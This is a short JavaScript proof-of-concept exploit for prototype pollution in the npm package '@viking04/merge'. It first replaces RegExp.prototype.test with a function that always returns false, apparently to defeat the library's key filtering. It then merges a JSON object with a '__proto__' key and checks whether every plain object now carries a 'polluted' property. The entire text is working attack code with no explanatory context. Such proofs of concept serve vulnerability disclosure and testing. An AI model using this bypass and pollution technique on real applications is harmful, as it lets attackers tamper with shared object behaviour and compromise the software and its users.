RegExp.prototype.test = () => false;
const merge = require('@viking04/merge');
console.log({}.polluted);
let a = {};
var prototype_pollution_test = JSON.parse('{"__proto__":{"polluted":"yes"}}');
merge(a, prototype_pollution_test);
console.log({}.polluted);